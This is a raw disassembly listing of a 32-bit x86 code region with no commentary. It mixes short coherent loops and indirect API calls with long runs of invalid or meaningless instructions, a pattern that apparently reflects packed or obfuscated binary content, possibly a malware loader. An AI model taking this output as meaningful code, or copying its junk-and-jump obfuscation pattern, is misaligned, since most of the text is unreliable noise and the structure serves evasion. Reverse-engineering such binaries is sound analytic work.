  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42edcb
  406bdf:	and    edi,DWORD PTR ds:0x4304e3
  406be5:	mov    DWORD PTR ds:0x42edcb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x6be97504
  406bfe:	push   es
  406bff:	or     eax,0x7e7e3a65
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406c12
  406c09:	call   0x347f:0x838c11d5
  406c10:	lods   al,BYTE PTR ds:[esi]
  406c11:	and    ebx,DWORD PTR ds:0xaa587d5e
  406c17:	sbb    esp,esp
  406c19:	or     ebp,edi
  406c1b:	fwait
  406c1c:	mov    eax,ds:0x33437388
  406c21:	neg    BYTE PTR [edx-0x7d29aba5]
  406c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c28:	clc    
  406c29:	mov    cl,0xf0
  406c2b:	fistp  DWORD PTR [ecx+0x62f3e152]
  406c31:	call   0xf091:0x5dc14d72
  406c38:	(bad)  
  406c39:	clc    
  406c3a:	fadd   st,st(3)
  406c3c:	aad    0xa5
  406c3e:	or     DWORD PTR [edx],ecx
  406c40:	scas   al,BYTE PTR es:[edi]
  406c41:	mov    al,ds:0x253e677f
  406c46:	into   
  406c47:	imul   esp,DWORD PTR [ebx-0x56c202f0],0x15
  406c4e:	pop    esp
  406c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c50:	xchg   edi,eax
  406c51:	adc    DWORD PTR [esi-0x27c5cc20],esp
  406c57:	jae    0x406c95
  406c59:	sbb    eax,0xcebd4afb
  406c5e:	adc    bl,BYTE PTR [ebp+0x2b]
  406c61:	add    edi,ebx
  406c63:	mov    ds:0xc1756a32,eax
  406c68:	mov    fs,esp
  406c6a:	aam    0x20
  406c6c:	inc    eax
  406c6d:	jo     0x406ca1
  406c6f:	into   
  406c70:	inc    edx
  406c71:	loopne 0x406c79
  406c73:	sub    esi,esp
  406c75:	in     al,dx
  406c76:	mov    ebx,0x3348543e
  406c7b:	icebp  
  406c7c:	and    DWORD PTR [esi],edx
  406c7e:	inc    edx
  406c7f:	ss jbe 0x406c02
  406c82:	jle    0x406cdc
  406c84:	shl    BYTE PTR [ebp-0x12],0x65
  406c88:	or     eax,DWORD PTR [ebp+edx*8-0x60]
  406c8c:	pop    ebp
  406c8d:	xor    al,BYTE PTR [ecx-0x17]
  406c90:	adc    eax,0xee24c1ec
  406c95:	retf   0xdc95
  406c98:	repnz aaa 
  406c9a:	sub    BYTE PTR [ecx+0x7f5795ee],cl
  406ca0:	xor    al,0x51
  406ca2:	jo     0x406c44
  406ca4:	push   edi
  406ca5:	and    eax,esi
  406ca7:	int3   
  406ca8:	add    DWORD PTR [edi-0x2fb812b5],edi
  406cae:	adc    DWORD PTR [edx+eax*1+0x36334299],0x52
  406cb6:	jp     0x406caf
  406cb8:	fld    st(3)
  406cba:	mov    dh,0xe0
  406cbc:	mov    cl,0xe6
  406cbe:	imul   dh
  406cc0:	mov    edi,0x3bf33eb4
  406cc5:	mov    cl,0x75
  406cc7:	sbb    eax,0x44fd4bb0
  406ccc:	leave  
  406ccd:	add    edx,ecx
  406ccf:	push   ss
  406cd0:	and    eax,eax
  406cd2:	lahf   
  406cd3:	cmp    ebp,DWORD PTR [edi+0x39a6ad88]
  406cd9:	out    dx,eax
  406cda:	stos   BYTE PTR es:[edi],al
  406cdb:	inc    ecx
  406cdc:	jecxz  0x406d14
  406cde:	nop
  406cdf:	imul   ecx,ebp,0xf92f7d8b
  406ce5:	cmp    BYTE PTR [edi+0x3],ch
  406ce8:	mov    fs,WORD PTR [eax+0x5170452b]
  406cee:	sti    
  406cef:	push   es
  406cf0:	push   ecx
  406cf1:	int    0x4c
  406cf3:	fild   QWORD PTR [edx+esi*1-0x7ae189f2]
  406cfa:	sti    
  406cfb:	popf   
  406cfc:	cmp    BYTE PTR [ecx+0x27],0xfc
  406d00:	cmp    al,0xc1
  406d02:	mov    dl,0x72
  406d04:	jb     0x406c94
  406d06:	inc    edi
  406d07:	scas   eax,DWORD PTR es:[edi]
  406d08:	jge    0x406c90
  406d0a:	jp     0x406d83
  406d0c:	jns    0x406cc2
  406d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d0f:	adc    edx,eax
  406d11:	rcr    BYTE PTR [ebp-0x3a],1
  406d14:	pop    ecx
  406d15:	je     0x406d1e
  406d17:	adc    BYTE PTR [edi+0x69],cl
  406d1a:	fcom   DWORD PTR [eax+0x6a]
  406d1d:	mov    cl,0x64
  406d1f:	addr16 mov ebx,0xc1b47b50
  406d25:	dec    ebp
  406d26:	rcl    BYTE PTR [edx-0x37adb831],0x60
  406d2d:	and    BYTE PTR [edi+0x38af04cc],ah
  406d33:	daa    
  406d34:	in     eax,dx
  406d35:	into   
  406d36:	les    esi,FWORD PTR [edi]
  406d38:	xlat   BYTE PTR ds:[ebx]
  406d39:	xchg   esi,eax
  406d3a:	or     al,0x37
  406d3c:	sbb    ah,0x8f
  406d3f:	and    ebx,esp
  406d41:	sub    eax,esi
  406d43:	or     eax,0x9bd553d7
  406d48:	int    0xfd
  406d4a:	adc    eax,ecx
  406d4c:	out    0xca,al
  406d4e:	or     DWORD PTR [ebx],edi
  406d50:	xchg   DWORD PTR [ecx],esp
  406d52:	shl    DWORD PTR [ebx+0x3b],cl
  406d55:	(bad)  
  406d56:	std    
  406d57:	add    edx,ecx
  406d59:	mov    esp,0x2e1134d5
  406d5e:	fwait
  406d5f:	inc    edi
  406d60:	test   eax,0xff2cbdf
  406d65:	jecxz  0x406d11
  406d67:	ror    esp,cl
  406d69:	add    al,0xb3
  406d6b:	or     eax,0x4e6b858d
  406d70:	retf   
  406d71:	sbb    al,ch
  406d73:	mov    ebx,0x6f306872
  406d78:	sub    DWORD PTR [edi+0x7db2a7d9],eax
  406d7e:	adc    eax,0xcde2ff54
  406d83:	and    BYTE PTR [ecx+0x38894ea6],0x84
  406d8a:	(bad)  
  406d8b:	nop
  406d8c:	pushw  ds
  406d8e:	test   dh,0x55
  406d91:	das    
  406d92:	lods   eax,DWORD PTR ds:[esi]
  406d93:	je     0x406d4b
  406d95:	rep repnz stos DWORD PTR es:[edi],eax
  406d98:	lds    ecx,FWORD PTR [ecx-0x2efc66b1]
  406d9e:	and    DWORD PTR ds:0x4304df,0x0
  406da8:	mov    edi,DWORD PTR ds:0x4304df
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x4304df,edi
  406db5:	cmp    DWORD PTR ds:0x4304df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42ec23
  406dcb:	cmp    DWORD PTR ds:0x4304df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4304df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4304df,edi
  406de7:	cmp    DWORD PTR ds:0x4304df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e7c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx+0x5cb88485],si
  406e0c:	mov    ch,0x49
  406e0e:	and    dh,cl
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406de1
  406e18:	mov    esp,0xd1a9f370
  406e1d:	addr16 cdq 
  406e1f:	inc    ecx
  406e20:	and    BYTE PTR [ebx+0xd],0x2d
  406e24:	mov    eax,ds:0x9c46115d
  406e29:	shl    BYTE PTR [edx+0x20a36fa4],0xdd
  406e30:	push   ebp
  406e31:	cld    
  406e32:	outs   dx,BYTE PTR ds:[esi]
  406e33:	jle    0x406e3d
  406e35:	sahf   
  406e36:	or     DWORD PTR es:[edx+0x73e40b15],0x52
  406e3e:	push   ebx
  406e3f:	(bad)  
  406e40:	xchg   DWORD PTR [eax-0x4f],ecx
  406e43:	loop   0x406e4b
  406e45:	inc    esp
  406e46:	mov    edx,0x265fde76
  406e4b:	scas   al,BYTE PTR es:[edi]
  406e4c:	push   0x2584ba7a
  406e51:	dec    esi
  406e52:	cli    
  406e53:	fsubp  st(3),st
  406e55:	mov    dl,0x5b
  406e57:	xlat   BYTE PTR ds:[ebx]
  406e58:	add    BYTE PTR [ecx-0x39],ch
  406e5b:	sbb    ebp,DWORD PTR [esi]
  406e5d:	xchg   ebx,eax
  406e5e:	mov    dh,0x98
  406e60:	ins    BYTE PTR es:[edi],dx
  406e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e62:	inc    esi
  406e63:	xor    bl,cl
  406e65:	or     edi,DWORD PTR [eax]
  406e67:	mov    bh,0x18
  406e6a:	xor    al,0x3e
  406e6c:	(bad)  [ebx+0x25da75a3]
  406e72:	pop    ebx
  406e73:	(bad)  
  406e74:	adc    BYTE PTR [edi+edi*2+0x32],cl
  406e78:	pusha  
  406e79:	hlt    
  406e7a:	sub    BYTE PTR [ecx-0x6e96c2de],dh
  406e80:	repnz sbb al,0x4a
  406e83:	pop    ebp
  406e84:	mov    cl,BYTE PTR [edx+0x6bfff5fc]
  406e8a:	lahf   
  406e8b:	inc    esp
  406e8c:	(bad)  
  406e8d:	push   cs
  406e8e:	or     BYTE PTR [ebp+0x5c],cl
  406e91:	push   eax
  406e92:	cmp    edi,ecx
  406e94:	aad    0xae
  406e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e97:	push   ds
  406e98:	pusha  
  406e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e9a:	cs jb  0x406e5c
  406e9d:	sahf   
  406e9e:	push   eax
  406e9f:	xor    BYTE PTR [esi-0x68],al
  406ea2:	and    BYTE PTR [ebx+0x3b158bf5],dl
  406ea8:	js     0x406ec8
  406eaa:	jno    0x406f05
  406eac:	data16 fnclex 
  406eaf:	push   0xefc4d848
  406eb4:	mov    WORD PTR [edx-0x30c51502],cs
  406eba:	fwait
  406ebb:	clc    
  406ebc:	addr16 mov edi,0x95a8b4e0
  406ec2:	fsub   DWORD PTR [ebx-0x4d950cc8]
  406ec8:	mov    ecx,0xba842b5f
  406ecd:	jp     0x406f40
  406ecf:	outs   dx,DWORD PTR ds:[esi]
  406ed0:	daa    
  406ed1:	sub    eax,0xa8c49d3e
  406ed6:	and    eax,0x3c48c78c
  406edb:	dec    esp
  406edc:	repnz lods eax,DWORD PTR ds:[esi]
  406ede:	xchg   edx,eax
  406edf:	mov    dh,0xf8
  406ee1:	test   DWORD PTR [eax],0xe8b6616c
  406ee7:	ret    
  406ee8:	test   DWORD PTR [ecx-0x1e],ecx
  406eeb:	inc    edi
  406eec:	por    mm5,QWORD PTR [edx]
  406eef:	lea    edx,[ebx+0x4615dfa5]
  406ef5:	(bad)  
  406ef6:	sbb    BYTE PTR [eax+0x6189da76],ch
  406efc:	inc    edi
  406efd:	mov    ecx,0x82bff6e2
  406f02:	sub    BYTE PTR [ebx],ah
  406f04:	ja     0x406f45
  406f06:	cmp    DWORD PTR [esi+0xa26de97],edx
  406f0c:	add    eax,0x9dd09fa1
  406f11:	jge    0x406ed9
  406f13:	daa    
  406f14:	xchg   edx,eax
  406f15:	mov    DWORD PTR [ebx],esi
  406f17:	loop   0x406ef7
  406f19:	and    al,0x8
  406f1b:	mov    al,0xfd
  406f1d:	adc    ebx,DWORD PTR [esi]
  406f1f:	in     eax,dx
  406f20:	rcl    DWORD PTR [ecx],1
  406f22:	popf   
  406f23:	xor    al,0x1c
  406f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f26:	in     al,dx
  406f27:	push   0xd1aeac8c
  406f2c:	repz hlt 
  406f2e:	inc    edi
  406f2f:	add    ecx,ebp
  406f31:	xchg   esi,eax
  406f32:	add    dl,0x64
  406f35:	sub    BYTE PTR [esi+0x4c385c81],bh
  406f3b:	dec    ebx
  406f3c:	push   edi
  406f3d:	ins    DWORD PTR es:[edi],dx
  406f3e:	shl    DWORD PTR [ecx],0x5b
  406f41:	repz xor dl,BYTE PTR [ebx]
  406f44:	es jl  0x406ef1
  406f47:	rcr    DWORD PTR [eax-0x43104295],cl
  406f4d:	outs   dx,DWORD PTR ds:[esi]
  406f4e:	pop    esp
  406f4f:	mov    edx,DWORD PTR [edx]
  406f51:	mov    WORD PTR [edi+0x4f10a011],?
  406f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f58:	pop    eax
  406f59:	not    DWORD PTR gs:[ecx-0x33]
  406f5d:	fcom   QWORD PTR [edx+0x16]
  406f60:	fnstsw WORD PTR [ebx-0x62ecdcb2]
  406f66:	inc    ecx
  406f67:	pop    edi
  406f68:	sub    esp,DWORD PTR [eax]
  406f6a:	mov    dh,0x4b
  406f6c:	pop    es
  406f6d:	test   DWORD PTR [esi],0x1dbab91b
  406f73:	and    esi,0xffffff97
  406f76:	pushf  
  406f77:	daa    
  406f78:	sub    edi,esp
  406f7a:	or     eax,0xb6964efb
  406f7f:	fidiv  DWORD PTR [edi]
  406f81:	ror    DWORD PTR [ecx],cl
  406f83:	pop    ecx
  406f84:	retf   0x4124
  406f87:	and    bl,al
  406f89:	fdiv   QWORD PTR [eax-0x48]
  406f8c:	ja     0x406fb4
  406f8e:	(bad)
  406f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f93:	or     ebp,DWORD PTR [ebx]
  406f95:	mov    ebp,DWORD PTR [ebx+0x25f5ebf3]
  406f9b:	adc    al,0xf1
  406f9d:	cmp    DWORD PTR [ecx],esp
  406f9f:	xchg   ebx,eax
  406fa0:	ror    BYTE PTR [edx],1
  406fa2:	mov    ch,0x8f
  406fa4:	inc    eax
  406fa5:	push   ebp
  406fa6:	jnp    0x406f3e
  406fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa9:	mov    al,ds:0xf85589aa
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x430465
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x430445,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0xe23d3d82,edx
  406fd4:	sub    BYTE PTR [esi+0x7e7ec60d],cl
  406fda:	mov    bh,BYTE PTR [edi+0x7e]
  406fdd:	jle    0x40702b
  406fdf:	pushf  
  406fe0:	pop    edx
  406fe1:	sub    al,dh
  406fe3:	test   DWORD PTR [esi+0x3c9e5e6d],eax
  406fe9:	and    bh,BYTE PTR [ebp+0x64]
  406fec:	retf   
  406fed:	lea    ebx,[ecx-0x4a]
  406ff0:	mov    esi,0xce194585
  406ff5:	scas   al,BYTE PTR es:[edi]
  406ff6:	(bad)  
  406ff8:	inc    DWORD PTR [edi]
  406ffa:	push   ds
  406ffb:	sub    eax,0x7c7e8cec
  407000:	mul    bh
  407002:	jmp    0x406fa6
  407004:	std    
  407005:	lods   al,BYTE PTR ds:[esi]
  407006:	ret    0xe1e7
  407009:	ror    bh,0x33
  40700c:	cs (bad) 
  40700e:	push   ebx
  40700f:	jo     0x407021
  407011:	jmp    0x573503c6
  407016:	aam    0x30
  407018:	pop    ebx
  407019:	ins    DWORD PTR es:[edi],dx
  40701a:	inc    edx
  40701b:	and    al,0x1c
  40701d:	jno    0x40702f
  40701f:	ret    
  407020:	lea    ecx,[ebp+0x4d]
  407023:	test   eax,0x443c684d
  407028:	cmp    al,0x3d
  40702a:	nop
  40702b:	loop   0x40701b
  40702d:	jo     0x407039
  40702f:	sub    bh,dl
  407031:	inc    esp
  407032:	test   BYTE PTR [edx],dl
  407034:	outs   dx,BYTE PTR ds:[esi]
  407035:	cmp    eax,0x5e635261
  40703a:	inc    ebp
  40703b:	mov    ecx,0xefa4b0ec
  407040:	dec    esp
  407041:	fst    QWORD PTR [esi]
  407043:	xor    BYTE PTR [eax-0x1d],dl
  407046:	cmp    eax,0xcac99995
  40704b:	in     al,0xfb
  40704d:	xchg   DWORD PTR [esp+ecx*4],esp
  407050:	repnz sar DWORD PTR [ebx],1
  407053:	test   edx,edi
  407055:	retf   0x3565
  407058:	cdq    
  407059:	jnp    0x407090
  40705b:	outs   dx,BYTE PTR ds:[esi]
  40705c:	inc    esi
  40705d:	sti    
  40705e:	fidiv  WORD PTR [ebp-0x17]
  407061:	sbb    edi,ebx
  407063:	inc    eax
  407064:	mov    BYTE PTR [eax+edx*4-0x3b406600],dh
  40706b:	(bad)  
  40706c:	hlt    
  40706d:	pcmpeqb mm5,mm3
  407070:	pop    es
  407071:	in     al,0x47
  407073:	mov    esp,0xd1af3710
  407078:	stc    
  407079:	xor    BYTE PTR [eax+0x6671152f],bl
  40707f:	imul   ebx,ecx,0xe3674470
  407085:	in     eax,dx
  407086:	call   0x74f4e052
  40708b:	and    DWORD PTR ds:0xf0093c8,ebx
  407091:	les    ecx,FWORD PTR [ecx+0x5c55de0]
  407097:	sbb    dh,ch
  407099:	inc    edx
  40709a:	cli    
  40709b:	(bad)  
  40709c:	lods   eax,DWORD PTR ds:[esi]
  40709d:	je     0x4070da
  40709f:	scas   al,BYTE PTR es:[edi]
  4070a0:	aad    0x4b
  4070a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070a3:	adc    ch,BYTE PTR [esi+0x1f]
  4070a6:	inc    eax
  4070a7:	fs inc eax
  4070a9:	loopne 0x40704a
  4070ab:	push   es
  4070ac:	xchg   edi,eax
  4070ad:	aaa    
  4070ae:	arpl   WORD PTR [eax-0x2c],bp
  4070b1:	mul    BYTE PTR [eax]
  4070b3:	pop    edx
  4070b4:	adc    BYTE PTR [esi-0x43a549c0],dh
  4070ba:	pop    eax
  4070bb:	cmp    DWORD PTR [eax],ebp
  4070bd:	jp     0x4070af
  4070bf:	mov    dl,0xee
  4070c1:	bswap  ebx
  4070c3:	mov    ds:0x6d925ec0,al
  4070c8:	pop    ecx
  4070c9:	and    BYTE PTR [esi-0x35672327],dh
  4070cf:	out    dx,al
  4070d0:	jne    0x407076
  4070d2:	add    dh,cl
  4070d4:	inc    esi
  4070d5:	push   ebp
  4070d6:	test   BYTE PTR [edx+0x54384cd6],ch
  4070dc:	mov    dl,BYTE PTR ds:0x1b6998e
  4070e2:	lock jl 0x40707c
  4070e5:	jns    0x407085
  4070e7:	lods   al,BYTE PTR ds:[esi]
  4070e8:	add    eax,0xcdcf5f46
  4070ed:	push   ds
  4070ee:	inc    edi
  4070ef:	ins    DWORD PTR es:[edi],dx
  4070f0:	or     esp,DWORD PTR [ebx-0x758afe98]
  4070f6:	xor    bh,BYTE PTR [ecx*4-0x567264b]
  4070fd:	mov    cl,0xbc
  4070ff:	fild   WORD PTR [esi+0x7944a561]
  407105:	mov    ecx,0xbebb1be2
  40710a:	sub    eax,0x2003499
  40710f:	scas   eax,DWORD PTR es:[edi]
  407110:	jno    0x407140
  407112:	stos   BYTE PTR es:[edi],al
  407113:	leave  
  407114:	imul   edx,DWORD PTR [ecx-0x28],0x20
  407118:	ror    ebx,1
  40711a:	sbb    eax,0x6979f05b
  40711f:	cmp    esp,DWORD PTR [edx+0x71]
  407122:	stos   DWORD PTR es:[edi],eax
  407123:	cmp    edi,DWORD PTR [esi-0x7e1dcf17]
  407129:	fwait
  40712a:	or     DWORD PTR [eax-0x52eb96c],0x5e
  407131:	sub    cl,BYTE PTR [eax-0x75c1e73b]
  407137:	repnz addr16 mov edi,0x6b1d0699
  40713e:	push   ss
  40713f:	int3   
  407140:	add    cl,ch
  407142:	std    
  407143:	mov    WORD PTR [esp+eax*8],ss
  407146:	icebp  
  407147:	inc    ecx
  407148:	pop    esi
  407149:	mov    dh,0x5f
  40714b:	pop    ds
  40714c:	test   eax,0xd0d7e811
  407151:	fidiv  WORD PTR [eax+0x7c]
  407154:	xor    ecx,esi
  407156:	inc    esp
  407157:	inc    esi
  407158:	repz popf 
  40715a:	add    BYTE PTR [ecx-0x617fb73d],0x99
  407161:	push   0x7560950b
  407166:	cmp    dh,0xc1
  407169:	sbb    bh,BYTE PTR [edx-0x62]
  40716c:	xor    eax,0x55191782
  407171:	fmul   DWORD PTR [ecx+0x25810c55]
  407177:	shl    bh,0x42
  40717a:	add    BYTE PTR [eax],al
  40717c:	add    BYTE PTR [eax],al
  40717e:	add    cl,ch
  407180:	or     eax,0x8b000000
  407185:	cmp    eax,0x42e7c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e7c0,edi
  407191:	cmp    DWORD PTR ds:0x42e7c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e7c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42eaab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430469,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43044d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430461,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430461
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430461,edi
  4071fa:	cmp    DWORD PTR ds:0x430461,0x6
  407201:	jne    0x407247
  407207:	push   0x42e929
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42eaaf
  407247:	cmp    DWORD PTR ds:0x430461,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430461
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430461,edi
  407261:	cmp    DWORD PTR ds:0x430461,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e7bc
  40728e:	or     DWORD PTR ds:0x430465,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x88f23f15
  4072a7:	xchg   esi,eax
  4072a8:	mov    al,ds:0x7e7ec799
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x40725e
  4072b2:	push   ebx
  4072b3:	inc    esp
  4072b4:	enter  0x8868,0xe4
  4072b8:	out    0x62,eax
  4072ba:	mov    cl,0xe
  4072bc:	jl     0x4072cc
  4072be:	pop    edi
  4072bf:	call   0x8a1c:0x13b15cba
  4072c6:	inc    ebp
  4072c7:	or     eax,0x684adeea
  4072cc:	fnstcw WORD PTR [edx+0x49]
  4072cf:	or     al,0x91
  4072d1:	cmp    bl,dl
  4072d3:	ror    BYTE PTR [edx],1
  4072d5:	int3   
  4072d6:	dec    esi
  4072d7:	cmp    esp,DWORD PTR [edi+0x41]
  4072da:	leave  
  4072db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072dc:	push   edx
  4072dd:	pop    ecx
  4072de:	bound  ebx,QWORD PTR [esi+0x3f2469a4]
  4072e4:	cli    
  4072e5:	pop    ss
  4072e6:	fmul   QWORD PTR [edx+ebx*8-0x5d]
  4072ea:	xchg   edi,eax
  4072eb:	jae    0x4072c0
  4072ed:	cmp    ch,BYTE PTR [ebp+0x33]
  4072f0:	cmp    BYTE PTR [esi],bl
  4072f2:	fdivr  DWORD PTR [edx]
  4072f4:	push   esp
  4072f5:	xor    BYTE PTR [ebx],0xa4
  4072f8:	mov    eax,ds:0x8f09062e
  4072fd:	not    edi
  4072ff:	clc    
  407300:	outs   dx,BYTE PTR fs:[esi]
  407302:	jnp    0x407286
  407304:	popf   
  407305:	cmp    cl,bh
  407307:	(bad)  
  407308:	repz adc bl,BYTE PTR [ebx-0x18]
  40730c:	enter  0x24d6,0x3f
  407310:	xchg   esp,eax
  407311:	ins    BYTE PTR es:[edi],dx
  407312:	inc    ebx
  407313:	inc    ebp
  407314:	push   ecx
  407315:	cmp    eax,0x7c5e0f07
  40731a:	and    eax,0x45170b24
  40731f:	mov    edi,0x3c36ff4
  407324:	mov    esi,0x72722167
  407329:	aaa    
  40732a:	out    0x1b,al
  40732c:	stc    
  40732d:	rol    BYTE PTR [esi],0x83
  407330:	sub    DWORD PTR [edi],0x7947cd3d
  407336:	loope  0x4072c7
  407338:	cmp    ecx,DWORD PTR [ebp-0x10d5c99d]
  40733e:	lods   eax,DWORD PTR ds:[esi]
  40733f:	sub    ecx,DWORD PTR [edx]
  407341:	xor    eax,0x8b3f1589
  407346:	jb     0x407369
  407348:	gs mov edx,0x8049c9ba
  40734e:	sbb    eax,0xa4951131
  407353:	add    DWORD PTR [ebx-0x1e],ecx
  407356:	cmc    
  407357:	gs aad 0x67
  40735a:	or     DWORD PTR [edx+esi*4+0x539ec333],eax
  407361:	cmp    BYTE PTR [esi+0x1a],ch
  407364:	pusha  
  407365:	repz ror DWORD PTR [esi],cl
  407368:	adc    bh,bl
  40736a:	imul   ebx
  40736c:	fistp  WORD PTR [ebx]
  40736e:	sbb    al,0xc5
  407370:	xor    ecx,ebx
  407372:	sbb    al,BYTE PTR [esi+eax*1]
  407375:	daa    
  407376:	mov    al,0x3c
  407378:	xlat   BYTE PTR ds:[ebx]
  407379:	inc    ebp
  40737a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40737b:	xchg   DWORD PTR [eax-0x66],ebx
  40737e:	xchg   ecx,eax
  40737f:	addr16 gs nop
  407382:	push   edx
  407383:	add    edx,DWORD PTR [edx]
  407385:	(bad)  
  407386:	das    
  407387:	(bad)  
  407389:	cmp    BYTE PTR [esi+0x14],bh
  40738c:	jmp    0x1dd1:0x71bfaa9b
  407393:	pop    eax
  407394:	cmp    bh,BYTE PTR [eax+0x4]
  407397:	dec    edi
  407398:	(bad)  
  407399:	shl    DWORD PTR [ebx],cl
  40739b:	add    bl,bl
  40739d:	aad    0x8d
  40739f:	xchg   DWORD PTR [ebx-0x67],edx
  4073a2:	ja     0x407328
  4073a4:	stos   DWORD PTR es:[edi],eax
  4073a5:	dec    eax
  4073a6:	rol    DWORD PTR [ecx-0x761a7801],cl
  4073ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ad:	into   
  4073ae:	je     0x40735f
  4073b0:	dec    esi
  4073b1:	(bad)  [edi-0x241c1ad1]
  4073b7:	js     0x407395
  4073b9:	adc    BYTE PTR [edi+0x70f7a2b0],dh
  4073bf:	int    0x12
  4073c1:	jae    0x407362
  4073c3:	cmp    bh,bh
  4073c5:	mov    BYTE PTR [ecx],dl
  4073c7:	mov    ah,0x33
  4073c9:	jl     0x4073c3
  4073cb:	pop    ebx
  4073cc:	sti    
  4073cd:	enter  0x67b6,0x89
  4073d1:	aaa    
  4073d2:	mov    edx,0xf11dc635
  4073d7:	mov    ch,0x6d
  4073d9:	add    al,0xb2
  4073db:	mov    al,ds:0x3f71f7ea
  4073e0:	add    DWORD PTR [edi],ecx
  4073e2:	scas   eax,DWORD PTR es:[edi]
  4073e3:	fstp   TBYTE PTR [eax+0x78]
  4073e6:	push   es
  4073e7:	out    dx,al
  4073e8:	popf   
  4073e9:	enter  0x502b,0xe3
  4073ed:	sbb    edx,DWORD PTR [edx-0x7b73d45d]
  4073f3:	(bad)  
  4073f4:	loope  0x4073a8
  4073f6:	inc    ebp
  4073f7:	jg     0x407438
  4073f9:	idiv   edi
  4073fb:	int3   
  4073fc:	mov    ah,0xb7
  4073fe:	jecxz  0x40745b
  407400:	jg     0x407480
  407402:	data16 jge 0x4073d5
  407405:	ins    DWORD PTR es:[edi],dx
  407406:	pslld  mm3,QWORD PTR [edx+0x39]
  40740a:	jb     0x40744d
  40740c:	mov    ecx,0xb14ddc4d
  407411:	loop   0x407425
  407413:	adc    al,0xf2
  407415:	adc    BYTE PTR [ebx-0x2ceca9e6],ah
  40741b:	push   esi
  40741c:	xchg   esi,eax
  40741d:	test   eax,0xc56c6dd4
  407422:	lock dec eax
  407424:	imul   eax,ecx,0x7de35c78
  40742a:	pop    ss
  40742b:	arpl   cx,sp
  40742d:	mov    dl,0x94
  40742f:	aas    
  407430:	pop    esi
  407431:	mov    ebx,0x2dbc29a2
  407436:	sbb    DWORD PTR [ebp+0x45],ebp
  407439:	push   0xffffffb1
  40743b:	push   ds
  40743c:	mov    ds:0x55e54037,al
  407441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
